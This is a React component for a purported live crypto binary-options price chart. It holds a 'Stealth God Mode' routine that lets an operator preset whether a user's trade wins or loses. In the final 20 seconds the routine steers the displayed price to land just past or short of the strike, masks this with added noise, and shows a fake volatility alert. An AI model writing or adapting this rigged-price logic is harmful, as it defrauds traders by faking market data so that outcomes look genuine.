"use client";

import { useEffect, useState, useRef } from "react";
import { OptionsTrade } from "@/context/UserContext";

interface OptionsChartProps {
  asset: string;
  basePrice: number;
  activeTrade?: OptionsTrade;
  onPriceUpdate?: (price: number) => void;
}

export function OptionsChart({ asset, basePrice, activeTrade, onPriceUpdate }: OptionsChartProps) {
  const [dataPoints, setDataPoints] = useState<number[]>([]);
  const lastPriceRef = useRef(basePrice);

  useEffect(() => {
    // Generate organic historical initial points Instead of a flat line
    let currentPoint = basePrice;
    const initialPoints = [];
    const volatility = basePrice * 0.0002;
    for (let i = 0; i < 50; i++) {
        initialPoints.push(currentPoint);
        currentPoint += (Math.random() - 0.5) * volatility;
    }
    // Reverse so the last point is closest to current
    initialPoints.reverse();
    setDataPoints(initialPoints);
    lastPriceRef.current = initialPoints[initialPoints.length - 1];
    if (onPriceUpdate) onPriceUpdate(lastPriceRef.current);
  }, [asset, basePrice]);

  useEffect(() => {
    const interval = setInterval(() => {
      let nextPrice = lastPriceRef.current;
      const volatility = basePrice * 0.0002; // Base tick volatility
      const randomMove = (Math.random() - 0.5) * volatility;

      if (activeTrade && activeTrade.status === "ACTIVE") {
        const timeLeftMs = (activeTrade.startTime + activeTrade.durationMinutes * 60 * 1000) - Date.now();
        
        // Stealth God Mode: Only manipulate in the final 20 seconds!
        if (activeTrade.adminResult && timeLeftMs <= 20000 && timeLeftMs > 0) {
           const userWantsUp = activeTrade.direction === "UP";
           const adminWantsWin = activeTrade.adminResult === "WIN";
           const targetIsUp = adminWantsWin ? userWantsUp : !userWantsUp;
           
           // Target EXACTLY $10 equivalent distance from strike (0.015% of BTC price) 
           // Make it look like they BARELY won or BARELY lost.
           const goalMargin = basePrice * 0.00015; 
           const targetZone = activeTrade.strikePrice + (targetIsUp ? goalMargin : -goalMargin);
           
           // Calculate exactly how far we need to steer it
           const diff = targetZone - nextPrice;
           
           // Smoothly glide 15% of the remaining gap each second to neatly land there
           const glide = diff * 0.15;
           
           // Add heavy volatility to mask the glide as a sudden market trend
           nextPrice += glide + ((Math.random() - 0.5) * (volatility * 2.5));
           
        } else {
           // Normal market walk (applies for the first 2m40s, or if no adminResult)
           nextPrice += randomMove;
        }
      } else {
        // NO ACTIVE TRADE: Check if we are displaced from the real asset price
        const diff = basePrice - nextPrice;
        if (Math.abs(diff) > basePrice * 0.00005) { // Any noticeable drift
           // Fast organic recovery curve: pull 20% of the distance back per tick (5-10 seconds repair)
           const pull = diff * 0.2;
           nextPrice += pull + randomMove; 
        } else {
           // Just regular market noise around base price
           nextPrice += (diff * 0.05) + randomMove; 
        }
      }

      lastPriceRef.current = nextPrice;
      if (onPriceUpdate) onPriceUpdate(nextPrice);
      
      setDataPoints(prev => {
        const newData = [...prev.slice(1), nextPrice];
        return newData;
      });
      
    }, 1000); // Update every 1 second for high-intensity action

    return () => clearInterval(interval);
  }, [activeTrade, basePrice]);

  const minPoint = Math.min(...dataPoints);
  const maxPoint = Math.max(...dataPoints);
  const range = (maxPoint - minPoint) || 1;
  const padding = range * 0.1;
  const adjustedMin = minPoint - padding;
  const adjustedMax = maxPoint + padding;
  const adjustedRange = adjustedMax - adjustedMin;

  // Generate SVG Path
  const width = 800;
  const height = 400;
  
  const pathData = dataPoints.map((point, index) => {
    const x = (index / (dataPoints.length - 1)) * width;
    const y = height - ((point - adjustedMin) / adjustedRange) * height;
    return `${index === 0 ? 'M' : 'L'} ${x} ${y}`;
  }).join(" ");

  const isUp = dataPoints[dataPoints.length - 1] >= dataPoints[dataPoints.length - 2];
  const strokeColor = activeTrade?.direction === "UP" 
    ? (activeTrade.adminResult === "WIN" ? "#10B981" : (activeTrade.adminResult === "LOSE" ? "#F43F5E" : "#6366F1"))
    : (activeTrade?.direction === "DOWN" ? (activeTrade.adminResult === "WIN" ? "#F43F5E" : (activeTrade.adminResult === "LOSE" ? "#10B981" : "#6366F1")) 
    : (isUp ? "#10B981" : "#F43F5E"));

  return (
    <div className="w-full h-full relative font-mono overflow-hidden rounded-2xl bg-[#0f111a] border border-gray-800">
      <div className="absolute top-4 left-4 z-10">
        <div className="text-3xl font-black tracking-tighter" style={{ color: strokeColor }}>
          ${lastPriceRef.current.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 6 })}
        </div>
        <div className="text-xs font-bold text-gray-500 uppercase tracking-widest mt-1">
          {asset}/USD Live Feed
        </div>
        {activeTrade?.adminResult && (
           <div className="mt-2 text-[10px] bg-rose-500/20 text-rose-400 px-2 py-0.5 rounded-full inline-block font-bold items-center gap-1 animate-pulse border border-rose-500/30">
             ⚡ MARKET VOLATILITY DETECTED
           </div>
        )}
      </div>

      <svg width="100%" height="100%" viewBox={`0 0 ${width} ${height}`} preserveAspectRatio="none" className="w-full h-[400px]">
        {/* Grid lines */}
        {[0.25, 0.5, 0.75].map(tick => (
           <line key={tick} x1="0" y1={height * tick} x2={width} y2={height * tick} stroke="#ffffff0a" strokeDasharray="4 4" />
        ))}
        {/* Area fill */}
        <path 
           d={`${pathData} L ${width} ${height} L 0 ${height} Z`} 
           fill={`url(#gradient-${strokeColor.replace('#', '')})`} 
           opacity={0.15} 
        />
        {/* Stroke */}
        <path 
           d={pathData} 
           fill="none" 
           stroke={strokeColor} 
           strokeWidth="3" 
           strokeLinejoin="round" 
           strokeLinecap="round" 
           style={{ filter: "drop-shadow(0 4px 6px rgba(0,0,0,0.5))" }}
        />
        {/* Strike Price Line if Active */}
        {activeTrade && activeTrade.status === "ACTIVE" && (
           <line 
             x1="0" 
             y1={height - ((activeTrade.strikePrice - adjustedMin) / adjustedRange) * height} 
             x2={width} 
             y2={height - ((activeTrade.strikePrice - adjustedMin) / adjustedRange) * height} 
             stroke={activeTrade.direction === "UP" ? "#10b981" : "#f43f5e"} 
             strokeDasharray="8 4" 
             strokeWidth="2"
             opacity="0.8"
           />
        )}
        <defs>
          <linearGradient id={`gradient-${strokeColor.replace('#', '')}`} x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%" stopColor={strokeColor} stopOpacity="1" />
            <stop offset="100%" stopColor={strokeColor} stopOpacity="0" />
          </linearGradient>
        </defs>
      </svg>
    </div>
  );
}
